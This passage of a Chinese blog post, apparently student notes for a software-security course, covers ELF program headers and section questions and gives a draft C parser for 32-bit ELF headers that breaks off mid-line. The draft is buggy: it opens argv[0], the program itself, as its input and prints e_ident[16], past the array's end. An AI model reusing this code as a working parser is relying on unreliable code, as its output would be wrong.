&lt;span class=&#34;comment&#34;&gt;//虚拟地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Addr	p_paddr;  &lt;span class=&#34;comment&#34;&gt;//物理地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Xword	p_filesz; &lt;span class=&#34;comment&#34;&gt;//在文件中的大小	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Xword	p_memsz;	&lt;span class=&#34;comment&#34;&gt;//在内存中的大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Xword	p_align;  &lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf64_Phdr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;PT-LOAD&#34;&gt;&lt;a href=&#34;#PT-LOAD&#34; class=&#34;headerlink&#34; title=&#34;PT_LOAD&#34;&gt;&lt;/a&gt;PT_LOAD&lt;/h3&gt;&lt;p&gt;​		一个可执行文件至少有一个该类型的段.PT_LOAD表述的是可装载的段,这种类型的段会被装载或者映射到内存中,&lt;/p&gt;
&lt;h2 id=&#34;编译器如何对节段进行组织安排&#34;&gt;&lt;a href=&#34;#编译器如何对节段进行组织安排&#34; class=&#34;headerlink&#34; title=&#34;编译器如何对节段进行组织安排&#34;&gt;&lt;/a&gt;编译器如何对节段进行组织安排&lt;/h2&gt;&lt;p&gt;​		这里所说的是编译环节,从源代码到二进制文件.&lt;/p&gt;
&lt;h2 id=&#34;ELF装载过程&#34;&gt;&lt;a href=&#34;#ELF装载过程&#34; class=&#34;headerlink&#34; title=&#34;ELF装载过程&#34;&gt;&lt;/a&gt;ELF装载过程&lt;/h2&gt;&lt;p&gt;​		这里是指把二进制文件加载进内存的过程&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;h2 id=&#34;一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义&#34;&gt;&lt;a href=&#34;#一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义&#34; class=&#34;headerlink&#34; title=&#34;一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义&#34;&gt;&lt;/a&gt;一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221121391.png&#34; alt=&#34;image-20230323221121391&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;编译器如何对这些段进行编排和组织-顺序是否可以任意调换&#34;&gt;&lt;a href=&#34;#编译器如何对这些段进行编排和组织-顺序是否可以任意调换&#34; class=&#34;headerlink&#34; title=&#34;编译器如何对这些段进行编排和组织,顺序是否可以任意调换&#34;&gt;&lt;/a&gt;编译器如何对这些段进行编排和组织,顺序是否可以任意调换&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221148505.png&#34; alt=&#34;image-20230323221148505&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&#34;&gt;&lt;a href=&#34;#是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&#34; class=&#34;headerlink&#34; title=&#34;是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&#34;&gt;&lt;/a&gt;是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221203956.png&#34; alt=&#34;image-20230323221203956&#34;&gt;&lt;/p&gt;
&lt;p&gt;文件头52????&lt;/p&gt;
&lt;p&gt;magic number16字节 还剩36字节 &lt;/p&gt;
&lt;p&gt;8*2 + 4 * 2 + 4 + 4 * 2 &amp;#x3D; 36&lt;/p&gt;
&lt;p&gt;0x3e &amp;#x3D; 62 &lt;/p&gt;
&lt;h1 id=&#34;测试&#34;&gt;&lt;a href=&#34;#测试&#34; class=&#34;headerlink&#34; title=&#34;测试&#34;&gt;&lt;/a&gt;测试&lt;/h1&gt;&lt;p&gt;删除一些段,程序是否还能正常运行? 程序必须的段 节是哪些??&lt;/p&gt;
&lt;p&gt;怎么增删改text段等 欺骗编译器等&lt;/p&gt;
&lt;h1 id=&#34;代码编写&#34;&gt;&lt;a href=&#34;#代码编写&#34; class=&#34;headerlink&#34; title=&#34;代码编写&#34;&gt;&lt;/a&gt;代码编写&lt;/h1&gt;&lt;p&gt;自己也要编译成32位才行&lt;/p&gt;
&lt;p&gt;gcc -m32 1.c &amp;amp;&amp;amp; .&amp;#x2F;a.out test&lt;/p&gt;
&lt;p&gt;可以参考readelf&lt;/p&gt;
&lt;p&gt;先把32位的都给写好,然后再加上64位的&lt;/p&gt;
&lt;p&gt;1.改进,32位 64位,根据文件头判断,然后再进行解析&lt;/p&gt;
&lt;p&gt;解析段和节,名称 起始和结束位置, 大小,权限&lt;/p&gt;
&lt;p&gt;fatal error: elf32.h: No such file or directory&lt;br&gt; #include &amp;lt;elf32.h&amp;gt;&lt;/p&gt;
&lt;p&gt;fatal error: bits&amp;#x2F;libc-header-start.h: No such file or directory&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili&#34;&gt;https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;e_ident 怎么输出多位, c&lt;/p&gt;
&lt;p&gt;怎么定义空格字符呢?&lt;/p&gt;
&lt;p&gt;gcc -m32 1.c  需要编译成32位的,目前也只能解析32位程序&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;elf.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 解析文件头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// int check_elf_head(file)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//     printf(&amp;quot;just a test%d\n&amp;quot;,file[0]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//     return 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd, i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint8_t&lt;/span&gt; *mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;stat&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;st&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *StringTable, *interp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Ehdr *Elf_header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Phdr *Pro_header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Shdr *Section_header;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (argc &amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;usage: %s &amp;lt;executable&amp;gt; \n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((fd = open(argv[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], O_RDONLY)) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;//什么情况下会这样呢? 和权限好像没关系&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;open&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fstat(fd, &amp;amp;st) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        perror(&lt;span class=&#34;string&#34;&gt;&amp;quot;fstat&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mem = mmap(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, st.st_size, PROT_READ, MAP_PRIVATE, fd, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 64位还是32位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mem[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] == &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;it is 64 bit %d\n&amp;quot;&lt;/span&gt;,mem[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;it is 32 bit %d\n&amp;quot;&lt;/span&gt;,mem[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// check_elf_head(mem);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//头部信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf_header = (Elf32_Ehdr *)mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;e_ident:                           \t%10x\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_ident[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Type:                           \t%d\n&amp;quot;&lt;/span&gt;,Elf_header-&amp;gt;e_type);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Machine:                        